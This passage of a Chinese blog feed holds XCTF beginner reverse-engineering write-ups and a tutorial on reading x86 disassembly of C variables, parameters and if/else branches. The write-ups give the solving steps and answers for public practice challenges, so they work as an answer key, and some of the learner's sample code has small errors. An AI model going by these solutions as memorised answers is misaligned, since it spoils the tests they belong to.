alt="-w431" title>                </div>                <div class="image-caption">-w431</div>            </figure><p>输入正确的serial，会提示正确。</p><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733881777919.jpg" alt="-w602" title>                </div>                <div class="image-caption">-w602</div>            </figure><p>进入main函数，F5大法查看伪代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733882559724.jpg" alt="-w511" title>                </div>                <div class="image-caption">-w511</div>            </figure><p>发现是v10数组与v13数组逐对比后，如果相同就会输出正确的字眼。前面有对用户输入的v9进行一些处理，处理完后会放入v10中。下面具体分析一下如何处理就可以了，主要在sprintf函数和strcat函数。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733887654757.jpg" alt="-w379" title>                </div>                <div class="image-caption">-w379</div>            </figure><p>点击进去看到</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733887851687.jpg" alt="-w555" title>                </div>                <div class="image-caption">-w555</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733888354402.jpg" alt="-w632" title>                </div>                <div class="image-caption">-w632</div>            </figure><p>那就很清楚了，就是把v4字符串也就是刚刚输入的字符串进行格式化位16进制的整数输出到v8中，然后用strcat函数把处理后的v8放入v10。（此处原来的v10是空的，所以连接v10和v8，实际相当于把v8放入v10）</p><p>接下来就是v10与v13进行对比，v13是刚刚复制过来的<code>437261636b4d654a757374466f7246756e</code>，那就可以看出来咱们直接把这个进行16进制转回去就可以了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733891570437.jpg" alt="-w526" title>                </div>                <div class="image-caption">-w526</div>            </figure><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>这道题是拿到了一段c源码，打开发现关键处：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733897127019.jpg" alt="-w1023" title>                </div>                <div class="image-caption">-w1023</div>            </figure><p>可以看出来把<code>first second strlen(argv[3])</code>搞清楚是什么就可以了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733897938110.jpg" alt="-w590" title>                </div>                <div class="image-caption">-w590</div>            </figure><p>很简单可以看出这3个是什么值，下面直接放解密代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207;</span><br><span class="line">    printf(&quot;Get your key: &quot;);</span><br><span class="line">    printf(&quot;%x\n&quot;, hash);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到flag：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733900988974.jpg" alt="-w603" title>                </div>                <div class="image-caption">-w603</div>            </figure><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个看题目就是知道加了壳。且是个二进制文件，丢进edb看一下。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733910805939.jpg" alt="-w685" title>                </div>                <div class="image-caption">-w685</div>            </figure><p>单步调试走一会，在寄存器窗口看到：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733910639998.jpg" alt="-w1019" title>                </div>                <div class="image-caption">-w1019</div>            </figure><p>这很明显是加了UPX壳。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733911418603.jpg" alt="-w733" title>                </div>                <div class="image-caption">-w733</div>            </figure><p>这里就用<code>upx -d</code>直接一键脱壳。以后可以练习手动脱upx壳。<br>脱壳完成后用IDA进行分析：</p><h3 id="IDA静态分析-1"><a href="#IDA静态分析-1" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733913704154.jpg" alt="-w617" title>                </div>                <div class="image-caption">-w617</div>            </figure><p>打开直接出现了flag，这个题就考个识别壳和upx脱壳了。</p><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h2><h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Xctf-RE新手区WP&quot;&gt;&lt;a href=&quot;#Xctf-RE新手区WP&quot; class=&quot;headerlink&quot; title=&quot;Xctf_RE新手区WP&quot;&gt;&lt;/a&gt;Xctf_RE新手区WP&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C语言与反汇编学习（四）</title>
    <link href="https://chumen77.github.io/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://chumen77.github.io/2019/10/23/C语言与反汇编学习（四）/</id>
    <published>2019-10-23T14:48:14.000Z</published>
    <updated>2019-11-01T07:24:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（四）"><a href="#C语言与反汇编学习（四）" class="headerlink" title="C语言与反汇编学习（四）"></a>C语言与反汇编学习（四）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习以下内容</p><ol><li>内存图</li><li>全局变量、局部变量</li><li>函数参数的分析</li><li>分支语句:<code>if</code> <code>if...else...</code> <code>if..else if..else if....else``分支语句的嵌套使用</code>的正向与逆向分析</li></ol><h2 id="内存图"><a href="#内存图" class="headerlink" title="内存图"></a>内存图</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15718432593875.jpg" alt="-w301" title>                </div>                <div class="image-caption">-w301</div>            </figure><p>在电脑中任何一个程序运行时，其会在内存中分成以上图中的几个区域。详细每个区是怎么样的，直接看图即可。</p><h2 id="全局变量、局部变量"><a href="#全局变量、局部变量" class="headerlink" title="全局变量、局部变量"></a>全局变量、局部变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int g_n = 10; //全局变量</span><br><span class="line">int Funcation() //代码区，调用时执行</span><br><span class="line">&#123;</span><br><span class="line">int x = 1;//局部变量</span><br><span class="line">int y = 3;</span><br><span class="line">return g_n+x+y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就用这个代码段来分析。</p><h3 id="全局变量的特点"><a href="#全局变量的特点" class="headerlink" title="全局变量的特点"></a>全局变量的特点</h3><p>1、全局变量在程序编译完成后地址就已经确定下来了，<strong>只要程序启动，全局变量就已经存在了</strong>，启动后里面是否有值取决于声明时是否给定了初始值，如果没有，默认为0。<br>2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.<br>3、全局变量所占内存会一直存在，知道整个进程结束.<br>4、全局变量的反汇编识别：<code>MOV 寄存器,byte/word/dword ptr ds:[0x12345678]</code><br>通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度.<strong>全局变量就是所谓的基址</strong>。</p><h3 id="局部变量的特点"><a href="#局部变量的特点" class="headerlink" title="局部变量的特点"></a>局部变量的特点</h3><p>1、局部变量在程序编译完成后并没有分配固定的地址.（因为计算机不知道什么时候会调用这个函数，所以不会提前分配好）<br>2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存.<br>3、当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据.局部变量消失.<br>4、局部变量只能在函数内部使用，函数A无法使用函数B的局部变量.（从堆栈图中也可以想象的到原理）<br>5、局部变量的反汇编识别：<code>[ebp-4]``[ebp-8]``[ebp-0xC]</code>等等类似的情形。</p><h2 id="函数参数的分析"><a href="#函数参数的分析" class="headerlink" title="函数参数的分析"></a>函数参数的分析</h2><p>如何判断函数有几个参数，已经分别是什么？</p><p>一般情况：<br>    步骤一：观察调用处的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    3</span><br><span class="line">push    2</span><br><span class="line">push    1</span><br><span class="line">call    0040100f</span><br></pre></td></tr></table></figure><p>步骤二：找到平衡堆栈的代码继续论证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call    0040100f</span><br><span class="line">add     esp,0Ch</span><br></pre></td></tr></table></figure><p>或者函数内部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret 4/8/0xC/0x10</span><br></pre></td></tr></table></figure><p>最后，两者一综合，函数的参数个数基本确定.可以应对百分之八十的情况。</p><p>但剩下的百分之二十呢？<br>上面的分析存在的问题：<br>1、<strong>参数传递未必都是通过堆栈，还可能通过使用寄存器</strong>.<br>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">mov ecx,dword ptr ds:[esi]</span><br><span class="line">mov edx,dword ptr ds:[edi]</span><br><span class="line">push 45</span><br><span class="line">push 33</span><br><span class="line">call 函数地址</span><br></pre></td></tr></table></figure><p>2、<strong>函数调用处的代码无法查看.</strong><br>例：<br>进入函数查看汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">00401050   push         ebp</span><br><span class="line">00401051   mov         ebp,esp</span><br><span class="line">00401053   sub         esp,48h</span><br><span class="line">00401056   push        ebx</span><br><span class="line">00401057   push        esi</span><br><span class="line">00401058   push        edi</span><br><span class="line">00401059   push        ecx</span><br><span class="line">0040105A   lea         edi,[ebp-48h]</span><br><span class="line">0040105D   mov         ecx,12h</span><br><span class="line">00401062   mov         eax,0CCCCCCCCh</span><br><span class="line">00401067   rep stos    dword ptr [edi]</span><br><span class="line">00401069   pop         ecx</span><br><span class="line">0040106A   mov         dword ptr [ebp-8],edx</span><br><span class="line">0040106D   mov         dword ptr [ebp-4],ecx</span><br><span class="line">00401070   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401073   add         eax,dword ptr [ebp-8]</span><br><span class="line">00401076   add         eax,dword ptr [ebp+8]</span><br><span class="line">00401079   mov         [g_x (00427958)],eax</span><br><span class="line">0040107E   pop         edi</span><br><span class="line">0040107F   pop         esi</span><br><span class="line">00401080   pop         ebx</span><br><span class="line">00401081   mov         esp,ebp</span><br><span class="line">00401083   pop         ebp</span><br><span class="line">00401084   ret         4</span><br></pre></td></tr></table></figure><p>观察步骤：<br>1、不考虑ebp、esp<br>2、只找给别人赋值的寄存器<br>eax/ecx/edx/ebx/esi/edi<br>3、找到以后追查其来源，如果，该寄存器中的值，不是在函数内存赋值的，那一定是传进来的参数.<br><strong>公式一：寄存器 + ret 4\8\0C = 参数个数<br>公式二：寄存器 + [ebp+8]+[ebp+0x] = 参数个数</strong><br>这两个公式可以互相结合验证看是否算的对。<br>如以上代码段，只可以找到<code>edi,ecx,edx</code>给别人赋值，但是其中<code>edi ecx</code>都是函数内存赋的值，所以只剩下<code>edx</code>，在加上最后的<code>ret 4</code>（这个肯定是push进来了一个参数）就等于2，也就是2个参数。与公式二检验发现没问题，<code>[ebp+0x]</code>类似的只出现一个.</p><h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><h3 id="正向代码练习"><a href="#正向代码练习" class="headerlink" title="正向代码练习"></a>正向代码练习</h3><p> 练习1:定义4个int类型的全局变量，分别是g_x,g_y,g_z,g_r,使用if..else..分支语句，将最大的值存储到g_r中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">int g_x = 5;</span><br><span class="line">int g_y = 3;</span><br><span class="line">int g_z = 7;</span><br><span class="line">int g_r = 0;</span><br><span class="line">void getMax()</span><br><span class="line">&#123;</span><br><span class="line">if(g_x&gt;g_y)</span><br><span class="line">&#123;</span><br><span class="line">if (g_x&gt;g_z)</span><br><span class="line">&#123;</span><br><span class="line">g_r=g_x;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">g_r=g_z;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">else if (g_y &gt; g_z)</span><br><span class="line">&#123;</span><br><span class="line">g_r=g_y;</span><br><span class="line">&#125;</span><br><span class="line">else g_r=g_z;</span><br><span class="line">printf(&quot;%d\n&quot;,g_r);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">getMax();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习2:找出数组里面最大的值，并存储到全局变量中<br>    <figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719199995620.jpg" alt="-w238" title>                </div>                <div class="image-caption">-w238</div>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">int a[4] = &#123;2,5,7,9&#125;;</span><br><span class="line">int g_r = 0;</span><br><span class="line">void getMax()</span><br><span class="line">&#123;</span><br><span class="line">if(a[0]&gt;a[1])</span><br><span class="line">&#123;</span><br><span class="line">if (a[0]&gt;a[2])</span><br><span class="line">&#123;</span><br><span class="line">if (a[0]&gt;a[3])</span><br><span class="line">&#123;</span><br><span class="line">g_r=a[0];</span><br><span class="line">&#125;</span><br><span class="line">else g_r=a[3];</span><br><span class="line">&#125;</span><br><span class="line">else if(a[2]&gt;a[3])&#123;</span><br><span class="line">g_r=a[2];</span><br><span class="line">&#125; </span><br><span class="line">else g_r=a[3];</span><br><span class="line">&#125;</span><br><span class="line">else if (a[1] &gt; a[2])</span><br><span class="line">&#123;</span><br><span class="line">if (a[1]&gt;a[3])</span><br><span class="line">&#123;</span><br><span class="line">g_r=a[1];</span><br><span class="line">&#125;</span><br><span class="line">else g_r=a[3];</span><br><span class="line">&#125;</span><br><span class="line">else if (a[2] &gt; a[3])</span><br><span class="line">&#123;</span><br><span class="line">g_r=a[2];</span><br><span class="line">&#125;</span><br><span class="line">else g_r=a[3];</span><br><span class="line">printf(&quot;%d\n&quot;,g_r);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">getMax();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h4><p>1：分支语句中if else,及其相互套用，要知道当某个条件成功后，执行其中的代码，然后以后于它的代码都不会再进行判断和执行。<br>2：一个if只对应于一个else，else只能在if后出现与其搭配使用。</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="IF语句逆向分析"><a href="#IF语句逆向分析" class="headerlink" title="IF语句逆向分析"></a>IF语句逆向分析</h4><p>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的近end中没有jmp指令。根据以上特征，把jxx指令取反后，即可还原if语句的代码。（<strong>我们要知道jcc代码跳转语句，其判断条件正好跟c的if判断条件是正好反过来的。</strong>）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719206938300.jpg" alt="-w262" title>                </div>                <div class="image-caption">-w262</div>            </figure><p>汇编代码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719208117580.jpg" alt="-w331" title>                </div>                <div class="image-caption">-w331</div>            </figure><p>对于这段代码我们采取一定的分析顺序来分析：</p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   无</li><li>分析全局变量       <code>mov  dword ptr 004225c4,ecx</code></li><li>功能分析:将参数X存到到EAX中，然后比较EAX,与参数Y的大小.如果X&lt;=Y 那么跳转到00401059的位置,否则，将X的值存储到全局变量中</li><li>返回值分析   无</li></ol><p>练习：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719212740917.jpg" alt="-w367" title>                </div>                <div class="image-caption">-w367</div>            </figure><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   <code>[ebp-4]：a</code></li><li>分析全局变量       <code>mov         eax,[004225c4]: m</code> </li><li>功能分析:(省略，直接以c语言代码表示)</li><li>返回值分析   无</li></ol><p><strong>逆为c函数</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int m=1;</span><br><span class="line">void Funcation(int x, int y)</span><br><span class="line">&#123;</span><br><span class="line">int a;</span><br><span class="line">a=m;</span><br><span class="line">if(x&lt;=y)</span><br><span class="line">&#123;</span><br><span class="line">y=y+a;</span><br><span class="line">m=y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719214461732.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h4 id="IF…ELSE…语句逆向分析"><a href="#IF…ELSE…语句逆向分析" class="headerlink" title="IF…ELSE…语句逆向分析"></a>IF…ELSE…语句逆向分析</h4><p>if..ees语句比if语句多出了-一个“else” ，当if表达式结果为真时跳过else分支语句块，当表达式结果为假时跳转到else 分支语句块中。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719216273356.jpg" alt="-w226" title>                </div>                <div class="image-caption">-w226</div>            </figure><p>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else中有的上方有jmp指令。else 代码的结尾没有jmp指令，else 的代码也会执行if _else. _end 的代码。根据以上特征，把jxx指令取反后，即可还原if…ese语句的代码<br><strong>总结：跳转执行一部分代码，不跳转执行另外一部分代码</strong><br>汇编代码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719219621907.jpg" alt="-w369" title>                </div>                <div class="image-caption">-w369</div>            </figure><p>同样安装一定的顺序：</p><p>1：分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code><br>2：分析局部变量   <code>[ebp-4] = eax = [004225c4]</code><br>3：分析全局变量       <code>[004225c4] G</code><br>4：功能分析:比较X与Y的大小，如果X&lt;=Y那么执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719249677324.jpg" alt="-w427" title>                </div>                <div class="image-caption">-w427</div>            </figure><p>如果X&gt;Y 那么执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719249899962.jpg" alt="-w435" title>                </div>                <div class="image-caption">-w435</div>            </figure><p>5：返回值分析   无<br><strong>练习：</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719223446828.jpg" alt="-w382" title>                </div>                <div class="image-caption">-w382</div>            </figure><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   <code>[ebp-4]：eax:[004225c4]:a</code> <code>[ebp-8]:b:2</code></li><li>分析全局变量       <code>mov         eax,[004225c4]</code> </li><li>功能分析:(省略，直接以c语言代码表示)</li><li>返回值分析   无</li></ol><p><strong>还原成c函数：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int m=1;</span><br><span class="line">void Funcation(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">int a,b;</span><br><span class="line">a=m;</span><br><span class="line">b=2;</span><br><span class="line">if (x&gt;=y)</span><br><span class="line">&#123;</span><br><span class="line">b=b+1;</span><br><span class="line">if (x&lt;y)</span><br><span class="line">&#123;</span><br><span class="line">m=b;</span><br><span class="line">&#125;else m=a+b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719224472672.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h4 id="IF…ELSE-IF…ELSE逆向分析"><a href="#IF…ELSE-IF…ELSE逆向分析" class="headerlink" title="IF…ELSE IF…ELSE逆向分析"></a>IF…ELSE IF…ELSE逆向分析</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719225611187.jpg" alt="-w307" title>                </div>                <div class="image-caption">-w307</div>            </figure><p>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else if中有jmp指令。else if的跳转目的else中有jmp指令，且else码的结尾没有jmp指令，<strong>所有jmp的目标地址一致</strong>。根据以上特征，把jxx指令取反，即可还原if…else if….else语句的代码。<br><strong>如果某个分支没有条件判断，则为else部分</strong>。<br>汇编代码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719226993158.jpg" alt="-w334" title>                </div>                <div class="image-caption">-w334</div>            </figure><pre><code>函数内部功能分析：                            1、分析参数：`[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z`                                                2、分析局部变量    `[ebp-4] = A = 0                        [ebp-8] = B = 1                        [ebp-0Ch] = C = 2`                                3、分析全局变量        无                                                    4、功能分析        </code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if(x&gt;y)</span><br><span class="line">&#123;</span><br><span class="line">    A = B+1;</span><br><span class="line">&#125;</span><br><span class="line">else if(x&gt;z)</span><br><span class="line">&#123;</span><br><span class="line">    A = C+1;</span><br><span class="line">&#125;</span><br><span class="line">else if(x&gt;z)</span><br><span class="line">&#123;</span><br><span class="line">    A = B+C</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    A = B+C+1;</span><br><span class="line">&#125;</span><br><span class="line">return A;</span><br></pre></td></tr></table></figure><p>练习：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719228667624.jpg" alt="-w305" title>                </div>                <div class="image-caption">-w305</div>            </figure><p>1、分析参数：<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2、分析局部变量    <code>[ebp-4] = A                        [ebp-8] = B                        [ebp-0Ch] = C</code><br>    3、分析全局变量        无<br>    4.返回值分析 a+1<br>    还原成C函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int Funcation(int x,int y,int z)</span><br><span class="line">&#123;</span><br><span class="line">int a=0;</span><br><span class="line">int b=1;</span><br><span class="line">int c=2;</span><br><span class="line">if (x&lt;=y)</span><br><span class="line">&#123;</span><br><span class="line">a=b-1;</span><br><span class="line">&#125;</span><br><span class="line">else if (y&gt;=z)</span><br><span class="line">&#123;</span><br><span class="line">a=c+1;</span><br><span class="line">&#125;</span><br><span class="line">else if (x&gt;z)</span><br><span class="line">&#123;</span><br><span class="line">a=b+c;</span><br><span class="line">&#125;</span><br><span class="line">else a=b+c-1;</span><br><span class="line">return a+1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div 